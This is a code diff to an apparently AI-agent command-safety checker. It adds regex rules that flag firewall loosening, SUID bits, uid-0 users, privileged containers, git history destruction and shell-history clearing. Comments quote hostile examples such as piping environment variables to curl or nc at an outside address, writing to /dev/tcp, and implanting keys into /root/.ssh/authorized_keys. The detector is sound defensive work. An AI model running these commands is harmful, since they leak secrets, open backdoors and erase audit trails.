+    (r'\bufw\b' + _SEGMENT_BOUND + r'\bdefault\b' + _SEGMENT_BOUND + r'\ballow\b',
+     "relax firewall default policy (ufw default allow)"),
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\bfrom\s+any\b',
+     "open firewall to any source (ufw allow from any)"),
+    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:deny|reject|limit)\b' + _SEGMENT_BOUND + r'\b22\b',
+     "deny SSH access (ufw deny 22)"),  # X312
+    # iptables: -F flushes every rule, -P rewrites a chain policy (DROP/ACCEPT), -A/-I/-D add or
+    # remove a rule, and `-j DROP|REJECT` is the drop-everything payload. `iptables -L -n
+    # --line-numbers` (X101) is a read-only listing and stays clean.
+    (r'\biptables\b' + _SEGMENT_BOUND
+     + r'\s(?:-F\b|--flush\b|-P\b|--policy\b|-A\b|--append\b|-I\b|--insert\b|-D\b|--delete\b'
+     + r'|-j\s+(?:drop|reject)\b)',
+     "modify firewall rules (iptables)"),  # X088 X089 X093 X106 X311
+    (r'\bnft\b' + _SEGMENT_BOUND + r'\bflush\b' + _SEGMENT_BOUND + r'\bruleset\b',
+     "flush nftables ruleset"),  # X092
+    # Same loosening class as `iptables -P INPUT ACCEPT` (already gated by the
+    # iptables rule) in nftables spelling. An unconditional `accept` in the input chain bypasses
+    # every preceding rule for all matched traffic. `nft add rule … drop|reject` stays covered
+    # conceptually by rule-tightening harm, but is NOT gated here — only the ACCEPT direction of
+    # an explicitly-added rule is the loosening; `nft list ruleset` (read-only) stays clean.
+    (r'\bnft\b' + _SEGMENT_BOUND + r'\badd\s+(?:rule|table)\b' + _SEGMENT_BOUND + r'\baccept\b',
+     "accept-all nftables rule (nft add rule ... accept)"),
+    # `fail2ban-client stop` turns off brute-force protection for every jail; `set … unban` (X109)
+    # only clears one already-banned address and stays clean.
+    (r'\bfail2ban-client\b' + _SEGMENT_BOUND + r'\bstop\b',
+     "stop fail2ban (disables brute-force protection)"),  # X110
+    # chmod that OPENS a credential/env file to group or other: the mode's last two octal digits are
+    # both >= 4 (644/755/664 …), and the target must name an env/credential file. Tightening
+    # (600: X200, 700: X325), a non-sensitive target (README.md: X198, blog/: X204) and a symbolic
+    # mode (g+w: X205) all stay clean. Placed BEFORE the world-writable rules' own class so
+    # `chmod 777/666` keeps "world/other-writable permissions".
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[0-7]?[0-7])?[4-7][4-7]\s+(?:-[^\s]+\s+)*\S*'
+     r'(?:\.env(?:\.[\w.-]+)*|credentials?|\.netrc|\.pgpass|\.npmrc|\.pypirc|id_rsa|id_ed25519|\.pem|\.key)\b',
+     "grant group/other read access to env/credential file"),  # X207 X220
+    # SUID/SGID bit: a setuid binary runs as its owner regardless of who invokes it — the classic
+    # local privilege-escalation primitive. Octal 4xxx/2xxx/6xxx or the symbolic `+s`.
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s(?:[ugoa]*\+s\b|[246][0-7]{3}\b)',
+     "set SUID bit on executable"),  # X190 X195
+    (r'\bchmod\b' + _SEGMENT_BOUND + r'\s0{3,4}\b',
+     "remove all permissions (chmod 000)"),  # X196
+    # Recursive chown of /root (or its .ssh) hands the whole home — private keys, .env, config — to
+    # another user. A subtree (`/root/builds`: X201, `/root/blog`: X208) is NOT the home
+    # itself and stays clean, so the target needs an explicit end-of-token boundary. `/root/.ssh` is
+    # folded to `~/.ssh` by _fold_resolved_ssh_dir before matching (HOME=/root), so both spellings
+    # are listed — the general home fold never fires for a single-component home, which is why a
+    # bare `/root` still arrives unfolded.
+    (r'\bchown\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*R[a-z]*\b|--recursive\b)' + _SEGMENT_BOUND
+     + r'\s(?:/root(?:/\.ssh)?(?:/\*)?|~/\.ssh(?:/\*)?|~)(?=[\s;|&]|$)',
+     "recursive chown of /root or /root/.ssh"),  # X189 X315
+    # usermod: adding a user to a privileged group (sudo/wheel/adm/docker — docker group is
+    # root-equivalent via the daemon socket) or locking an account.
+    (r'\busermod\b' + _SEGMENT_BOUND + r'\s-a[a-z]*G?[a-z]*\b' + _SEGMENT_BOUND + r'\b(?:sudo|wheel|adm|docker)\b',
+     "grant privileged group membership (usermod -aG sudo)"),  # X191
+    (r'\busermod\b' + _SEGMENT_BOUND + r'\s(?:-L\b|--lock\b)',
+     "lock user account (usermod -L)"),  # X301
+    # `passwd -d` removes the password hash entirely, so the account authenticates with an empty
+    # password — a silent remote-login door.
+    (r'\bpasswd\b' + _SEGMENT_BOUND + r'\s(?:-d\b|--delete\b)',
+     "delete user password (passwd -d)"),  # X192
+    (r'\bsetfacl\b' + _SEGMENT_BOUND + r'\s(?:-R\b|--recursive\b)',
+     "recursive ACL modification (setfacl -R)"),  # X193
+    # `credential.helper store` writes every git credential in plaintext to ~/.git-credentials,
+    # where any reader of the home directory (or a backup) picks up the tokens.
+    (r'\bgit\s+config\b' + _SEGMENT_BOUND + r'\bcredential\.helper\b' + _SEGMENT_BOUND + r'\bstore\b',
+     "store git credentials in plaintext (credential.helper store)"),  # X218
+    # Dumping the process environment to a file exposes every exported secret (API keys, DB URLs).
+    # Only a REDIRECT is gated: `printenv | tee .env backup` is already covered by the project
+    # env/config tee rule and must keep that reason (TestProjectSensitiveTeePattern).
+    (r'\bprintenv\b' + _SEGMENT_BOUND + r'\s>>?\s*\S',
+     "dump environment variables to file"),  # X219
+    # Residual: the same dump PUSHED OUTWARD instead of to a file — piped into a
+    # network client (`printenv | curl -X POST -d @- …`, `env | nc 1.2.3.4 4444`, `env -0 |
+    # socat …`) or redirected into the bash /dev/tcp pseudo-device. _CMDPOS anchors the dump
+    # word to a command position, so the exfil shape inside quoted prose or a grep pattern is
+    # data, not a command. `env FOO=1 curl …` stays clean two ways: `env` as a WRAPPER has no
+    # pipe/redirect sink after it, and where the wrapper IS consumed by _CMDPOS the remaining
+    # `curl …` is not the dump word. `env | grep PATH` pipes to a local tool — no sink matches.
+    (_CMDPOS + r'(?:printenv|env)\b' + r'[^;|&\n]*'
+     + r'(?:\|\s*(?:sudo\s+)?(?:env\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp)\b'
+     + r'|>>?\s*/dev/(?:tcp|udp)/)',
+     "exfiltrate environment variables over network (printenv/env pipe to network tool)"),
+    # uid-0 account: a second root by uid, invisible to `whoami`-based guards.
+    (r'\buseradd\b' + _SEGMENT_BOUND + r'\s(?:-u\s+0\b|--uid[=\s]+0\b)',
+     "create root-equivalent user (uid 0)"),  # X288
+    # `docker run --privileged` disables all container isolation (device + capability access), so a
+    # `-v /:/host` mount escapes straight to the host filesystem.
+    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*run\b' + _SEGMENT_BOUND + r'\s--privileged\b',
+     "docker run --privileged (container escapes to host)"),  # X313
+    # ── harm-layer "history" backlog (corpus, harm_layer=history) ──────
+    # False negatives whose harm is HISTORY/RECOVERY loss: uncommitted work discarded, a stash
+    # destroyed, the commit graph rewritten, the reflog recovery path expired, secrets pushed into
+    # commit history, or the shell history (the host's own audit trail) wiped.
+    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
+    # segment cannot contaminate the verdict, is _CMDPOS-anchored where the token could otherwise
+    # be quoted PROSE (`git commit -m "… git add .env …"` is data, not a command), and every rule
+    # was FP-measured against the corpus label-0 rows before landing (FP stays exactly the known
+    # 25 ids, no new id).
+    #
+    # `git checkout -- <path>` discards the uncommitted changes to <path>; the pre-image lives only
+    # in the index/HEAD, so there is no on-disk copy to recover. The `--` separator is what makes
+    # the operands PATHSPECS — a branch SWITCH (`git checkout main`, X051) carries no `--` and stays
+    # clean, as does `git checkout --orphan gh-pages` (the token after `--` is not a separator).
+    # The bare `git checkout .` spelling is the SAME discard-all without the separator and is
+    # accepted by the identical alternative; `git checkout ./file` is a PATH and does not match.
+    # `git restore --staged .` (X057) only unstages and is likewise clean.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+checkout\b' + _SEGMENT_BOUND + r'\s(?:--|\.)(?:\s|$)',
+     "git checkout -- (discards uncommitted changes)"),  # X033
+    # A stash is a one-copy safety net: `drop` deletes one entry, `clear` deletes every entry.
+    # `git stash push -m …` (X050) and `git stash pop` (X054) keep the entry and stay clean.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+stash\b' + _SEGMENT_BOUND + r'\s(?:drop|clear)\b',
+     "git stash drop/clear (destroys stashed changes)"),  # X038 X303
+    # `filter-repo`/`filter-branch` rewrite every commit hash in the repository: the original objects
+    # become unreachable and every clone/PR based on them is invalidated. Read-only spellings stay
+    # clean per the chain-wide rule ("no new rule may gate a lookup"): `--help`/`-h` print the man
+    # page, `--version` prints the banner, and `--dry-run` only REPORTS what would be rewritten
+    # (filter-repo never touches the object store under it). The lookahead is anchored to the token
+    # directly after the command word, so a flag further along the line does not buy an exemption,
+    # and a real rewrite (`--force`, `--tree-filter`, `--path`) is still gated.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+(?:filter-repo|filter-branch)\b'
+     + r'(?!\s+(?:--help\b|-h\b|--version\b|--dry-run\b))',
+     "git history rewrite (filter-repo/filter-branch)"),  # X035
+    # `reflog expire` drops the reflog entries that make a bad reset/rebase recoverable — the usual
+    # first half of "wipe the local evidence" (`&& git gc --prune=now` finishes the job).
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+reflog\b' + _SEGMENT_BOUND + r'\s+expire\b',
+     "git reflog expire (destroys recovery path)"),  # X302
+    # Committing an env file publishes every secret it holds into the repository history, where a
+    # later `git rm` cannot take it back (the blob stays in the pack and in every clone). Only the
+    # env-file family is gated. EXACT template suffixes — `.env.example`, `.env.sample`,
+    # `.env.template` (and prefixed variants like `.env.local.example`) — are exempted per the
+    # Review verdict: the industry standard is to commit templates (they hold no real
+    # values, only placeholders). Anything else in the family keeps the gate when in doubt
+    # (`.env`, `.env.local`, `.env.production`, `.env.*.local`, `.env.examples`).
+    # `--dry-run`/`-n` only REPORTS what would be staged — a lookup under the chain-wide criterion, so
+    # the flag anywhere BEFORE the env path suppresses the gate (tempered group: the scan from
+    # `add` to the path cannot cross a dry-run token). A path that precedes the flag
+    # (`git add .env --dry-run`) still gates — flag-last spellings are rare and gating the
+    # doubtful case is the safe direction. `git add -A` (X045) carries no env path either way.
+    (_CMDPOS + r'git\b' + _GIT_OPT + r'\s+add\b'
+     + r'(?:(?!--dry-run\b)(?!-n(?=[\s;|&)]))[^;|&\n])*'
+     + r'\s\S*'
+     + r'(?:(?:/|\.{1,2}/)?(?:[^\s/"\'`]+/)*\.env'
+     + r'(?!\.(?:[\w-]+\.)*(?:example|sample|template)\b)'
+     + r'(?:\.[^/\s"\'`]+)*)',
+     "git add of env file (secrets into commit history)"),  # X229
+    # `history -c` wipes the shell's command log — the only local record of what ran on the host,
+    # which is what an intruder clears first. _CMDPOS-anchored so `history` must be the command word
+    # (`grep history -c README`, `git log --oneline history -c` are data).
+    (_CMDPOS + r'history\b' + r'\s+-c\b', "clear shell history (history -c)"),  # X291
 ]
 
 
@@ -452,6 +1020,82 @@ _QUOTE_MASKED_DANGEROUS_DESCRIPTIONS = frozenset({
     "find dynamic shell word may expand to destructive flag",
     "dynamic shell word may expand to arbitrary program execution flag",
 })
+# Rules anchored on a COMMAND WORD must not fire on quoted prose. `echo 'ufw disable'`,
+# `grep -n 'iptables -F' notes.md` and `hermes ... --body "docker system prune -a --volumes"` pass
+# that text to a command as an ARGUMENT; the shell never runs it, so requiring approval for it is a
+# false positive that trains the operator to approve without reading. Same rationale as the
+# _CMDPOS-anchored rules above (mkfs/dd/shutdown) and the quote-masked hardline rules. Matching
+# runs against _mask_quoted_prose, which keeps quoted text the shell really executes RAW: `$(...)`
+# and backticks inside double quotes, plus the payload variants `_command_detection_variants()`
+# surfaces for shell carriers (`sh -c 'ufw disable'`) and interpreter flags (`python3 -c ...`).
+#
+# Deliberately NOT applied to the SQL-statement rules (`DROP SCHEMA`, `ALTER TABLE ... DROP
+# COLUMN`, `UPDATE ... SET ... = NULL`, `DELETE FROM`): there the quoted string IS the statement a
+# database client executes (`psql -c 'DELETE FROM leads WHERE id = 42'`), so it is code, not prose —
+# masking it would drop a real positive. Those rules keep matching quoted text, exactly as the
+# pre-existing `DROP TABLE|DATABASE` rule already does on main.
+_QUOTE_MASKED_COMMAND_DESCRIPTIONS = frozenset({
+    "kill PID 1 (init)",
+    "bring network interface down",
+    "systemctl isolate/rescue (drops all running services)",
+    "disable swap (swapoff)",
+    "write to sysrq-trigger (kernel emergency command)",
+    "symlink over /etc file (ln -sf)",
+    "write to authorized_keys (SSH key injection)",
+    "kill processes by name (killall)",
+    "kill processes on file/socket (fuser -k)",
+    "git mirror push (deletes/overwrites remote refs not present locally)",
+    "git push prune (deletes remote refs absent locally)",
+    "git push delete (removes a remote branch/ref)",
+    "git push force via +refspec prefix (rewrites remote history)",
+    "git push with lease (safe force variant, still overwrites when lease holds)",
+    "shred --remove (irreversible file destruction)",
+    "wipe filesystem signatures (wipefs)",
+    "truncate file to zero (data destruction)",
+    "redis data destruction (FLUSHALL/FLUSHDB/DEL)",
+    "pg_restore --clean (drops existing database objects)",
+    "drop PostgreSQL cluster (pg_dropcluster)",
+    "docker volume rm/prune (destroys volume data)",
+    "docker system prune --all/--volumes (destroys images and volumes)",
+    "docker rm --force (forced container removal)",
+    "docker pause (suspends container)",
+    "apt remove/purge of security or infrastructure package",
+    "rsync --delete over live data tree (deletes files missing at source)",
+    "remove crontab (crontab -r)",
+    "empty redirect truncates backup dump file",
+    "redirect overwrites latest backup file",
+    "ssh-keygen overwrites default SSH identity key",
+    "delete Vault secret (vault kv delete)",
+    "disable firewall (ufw disable/reset)",
+    "open database/app service port (ufw allow)",
+    "relax firewall default policy (ufw default allow)",
+    "open firewall to any source (ufw allow from any)",
+    "deny SSH access (ufw deny 22)",
+    "modify firewall rules (iptables)",
+    "flush nftables ruleset",
+    "accept-all nftables rule (nft add rule ... accept)",
+    "stop fail2ban (disables brute-force protection)",
+    "grant group/other read access to env/credential file",
+    "set SUID bit on executable",
+    "remove all permissions (chmod 000)",
+    "recursive chown of /root or /root/.ssh",
+    "grant privileged group membership (usermod -aG sudo)",
+    "lock user account (usermod -L)",
+    "delete user password (passwd -d)",
+    "recursive ACL modification (setfacl -R)",
+    "store git credentials in plaintext (credential.helper store)",
+    "dump environment variables to file",
+    "exfiltrate environment variables over network (printenv/env pipe to network tool)",
+    "create root-equivalent user (uid 0)",
+    "docker run --privileged (container escapes to host)",
+    "git checkout -- (discards uncommitted changes)",
+    "git stash drop/clear (destroys stashed changes)",
+    "git history rewrite (filter-repo/filter-branch)",
+    "git reflog expire (destroys recovery path)",
+    "git add of env file (secrets into commit history)",
+    "clear shell history (history -c)",
+})
+_QUOTE_MASKED_DANGEROUS_DESCRIPTIONS |= _QUOTE_MASKED_COMMAND_DESCRIPTIONS
 
 # Preserve approvals stored under the removed interpreter regex rules.
 _REMOVED_PATTERN_KEY_ALIASES = {
@@ -475,6 +1119,33 @@ def _approval_key_aliases(pattern_key: str) -> set[str]:
 
 
 # ---- Detection ----------------------------------------------------------------------------
+def _fold_resolved_ssh_dir(command: str) -> str:
+    """Fold ``<resolved home>/.ssh/`` to ``~/.ssh/`` (detection-time).
+
+    ``_home_prefix_fold_regex`` deliberately refuses a single-component home (a stray ``HOME``
+    must not rewrite unrelated prefixes), which left every ``~/.ssh`` rule DISARMED on a root-only
+    host where ``HOME=/root``: ``cat k >> /root/.ssh/authorized_keys`` (SSH key implant) and
+    ``cp evil /root/.ssh/authorized_keys`` auto-approved while the identical ``~`` spelling was
+    gated. The SSH directory is the one path whose absolute spelling is always the same security
+    surface (``authorized_keys``, private keys), so it is folded on its own — deliberately NARROWER
+    than relaxing the general home fold, which would also start gating ``>> /root/.bashrc`` (corpus
+    X297 is label 0, so the general fold would add a false positive).
+    """
+    try:
+        home = os.path.expanduser("~")
+        paths = [home, os.path.realpath(home)]
+    except Exception:
+        return command
+    for prefix in paths:
+        if not prefix or prefix in ("/", "~"):
+            continue
+        command = re.sub(
+            re.escape(prefix.rstrip("/")) + r"(?=[/\\]\.ssh(?:[/\\]|$))",
+            "~", command, flags=re.IGNORECASE,
+        )
+    return command
+
+
 def _normalize_command_for_detection(command: str) -> str:
     """Normalize a command before pattern matching so ANSI escapes, null bytes, Unicode fullwidth
     forms, and shell splicing tricks cannot bypass detection."""
@@ -490,6 +1161,7 @@ def _normalize_command_for_detection(command: str) -> str:
     # first: on Windows it nests under the user home, and folding the user home first would eat the prefix it needs.
     command = _rewrite_resolved_hermes_home(command)
     command = _rewrite_resolved_user_home(command)
+    command = _fold_resolved_ssh_dir(command)
     # Strip backslash-escapes (r\m -> rm) and empty-string literals (r''m -> rm).
     command = re.sub(r'\\([^\n])', r'\1', command)
     command = re.sub(r"''|\"\"", '', command)
@@ -1501,11 +2173,27 @@ def detect_dangerous_command(command: str) -> tuple:
     for command_variant in _command_detection_variants(command):
         command_lower = command_variant.lower()
         masked_lower: str | None = None
+        heredoc_masked_lower: str | None = None
         for pattern_re, description in DANGEROUS_PATTERNS_COMPILED:
             if description in _QUOTE_MASKED_DANGEROUS_DESCRIPTIONS:
                 if masked_lower is None:
-                    masked_lower = _mask_quoted_prose(command_variant).lower()
-                if pattern_re.search(masked_lower):
+                    # Quoted text is DATA, except under a shell carrier (sh -c, eval, source, .)
+                    # whose quoted argument is code the shell really runs — those scan raw, the
+                    # same rule the hardline matcher applies above.
+                    carrier = _contains_shell_carrier(command_lower)
+                    masked_lower = command_lower if carrier else _mask_quoted_prose(command_lower)
+                    # The command-word rules also treat heredoc BODIES as data (documentation written
+                    # to a file through `cat <<EOF > doc.md`); the two dynamic-word rules predate that
+                    # guard and keep their exact behaviour. Bodies are located before the quote mask
+                    # runs: `_mask_quoted_prose` blanks a QUOTED delimiter (`<<'EOF'`).
+                    heredoc_masked_lower = (
+                        masked_lower if carrier
+                        else _mask_quoted_prose(_mask_heredoc_bodies(command_lower))
+                    )
+                haystack = (
+                    heredoc_masked_lower if description in _QUOTE_MASKED_COMMAND_DESCRIPTIONS else masked_lower
+                )
+                if haystack is not None and pattern_re.search(haystack):
                     return (True, description, description)
             elif pattern_re.search(command_lower):
                 return (True, description, description)
